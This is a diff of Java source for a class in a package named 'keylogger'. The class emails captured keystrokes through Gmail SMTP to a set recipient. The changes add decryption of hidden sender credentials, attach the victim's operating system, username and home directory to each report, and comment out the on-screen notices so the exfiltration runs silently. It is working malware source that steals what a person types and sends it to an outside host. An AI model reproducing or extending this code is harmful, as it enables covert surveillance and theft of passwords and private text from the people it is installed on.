@@ -1,20 +1,29 @@
 package br.com.keylogger;
 
+import java.io.File;
 import java.text.SimpleDateFormat;
 import java.util.Date;
 import java.util.Properties;
 
+import javax.activation.DataHandler;
+import javax.activation.FileDataSource;
 import javax.mail.Address;
 import javax.mail.Message;
 import javax.mail.MessagingException;
+import javax.mail.Multipart;
 import javax.mail.PasswordAuthentication;
 import javax.mail.Session;
 import javax.mail.Transport;
 import javax.mail.internet.InternetAddress;
+import javax.mail.internet.MimeBodyPart;
 import javax.mail.internet.MimeMessage;
+import javax.mail.internet.MimeMultipart;
 import javax.swing.JOptionPane;
 
-public class Envio implements EmailIF, Observer {
+import br.com.adfgvxt.Cypher;
+import br.com.adfgvxt.CypherIF;
+
+public class Envio implements EmailIF, Observer, SystemIF {
 	private Properties props;
 	private Session session;
 	private Message message;
@@ -24,18 +33,20 @@ public class Envio implements EmailIF, Observer {
 	private String destinatario;
 	private Date data;
 	private SimpleDateFormat sdf;
+	private CypherIF cypher;
 	
 	public Envio(Subject subject, String email, String password, String destinatario) {
+		this.cypher = new Cypher("ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890@. ");
 		this.subject = subject;
-		this.email = email;
-		this.password = password;
+		this.email = this.cypher.decrypt(email).toLowerCase();
+		this.password = this.cypher.decrypt(password).toLowerCase();
 		this.destinatario = destinatario;
 		this.props = new Properties();
 		props.put("mail.smtp.host", "smtp.gmail.com");
         props.put("mail.smtp.socketFactory.port", "465");
-        props.put("mail.smtp.socketFactory.class", "javax.net.ssl.SSLSocketFactory");
-        props.put("mail.smtp.auth", "true");
-        props.put("mail.smtp.port", "465");
+       	props.put("mail.smtp.socketFactory.class", "javax.net.ssl.SSLSocketFactory");
+       	props.put("mail.smtp.auth", "true");
+       	props.put("mail.smtp.port", "465");
 	}
 	
 	public Envio(Subject subject) {
@@ -57,9 +68,12 @@ public class Envio implements EmailIF, Observer {
 		});
 		this.data = new Date();
 		this.sdf = new SimpleDateFormat("dd/MM/yyyy hh:mm:ss");
-		mensagem += "\n" + this.sdf.format(this.data);
-		this.session.setDebug(false);
-		JOptionPane.showMessageDialog(null, "ENVIANDO...\n"+mensagem);
+		
+		mensagem += "\n\nLOG: [" + this.sdf.format(this.data) + "]\n"+
+				this.getOS()+"\n"+this.getUser();
+		
+		this.session.setDebug(true);
+		//JOptionPane.showMessageDialog(null, "ENVIANDO...\n"+mensagem);	
 		try {
 			this.message = new MimeMessage(this.session);
 			this.message.setFrom(new InternetAddress(this.email));
@@ -67,10 +81,15 @@ public class Envio implements EmailIF, Observer {
 			Address[] destinatarios = InternetAddress.parse(destinatario);
 			
 			this.message.setRecipients(Message.RecipientType.TO, destinatarios);
-			this.message.setSubject("Atualiza��o do que foi digitado.");
+			this.message.setSubject("Atualização do que foi digitado.");
 			this.message.setText(mensagem);
 			Transport.send(this.message);
-			JOptionPane.showMessageDialog(null, "ENVIADO...");
+			//JOptionPane.showMessageDialog(null, "ENVIADO...");
+			this.data = null;
+			this.sdf = null;
+			this.session = null;
+			this.message = null;
+			System.gc();
 			return true;
 		} catch(MessagingException e) {
 			throw new RuntimeException(e);
@@ -108,6 +127,24 @@ public class Envio implements EmailIF, Observer {
 			this.enviarEmail(this.destinatario, captura.getoQueFoiEscrito());
 		}
 		
+	}
+
+	@Override
+	public String getOS() {
+		return "OS: "+System.getProperty("os.name")+
+				"\nVersion: "+System.getProperty("os.version");
+	}
+
+	@Override
+	public String getUser() {
+		return "User: "+System.getProperty("user.name")+
+				"\nDiretório padrão: "+System.getProperty("user.home");
+	}
+
+	@Override
+	public String getPropertiesSystem() {
+		// TODO Auto-generated method stub
+		return null;
 	}
 
 }
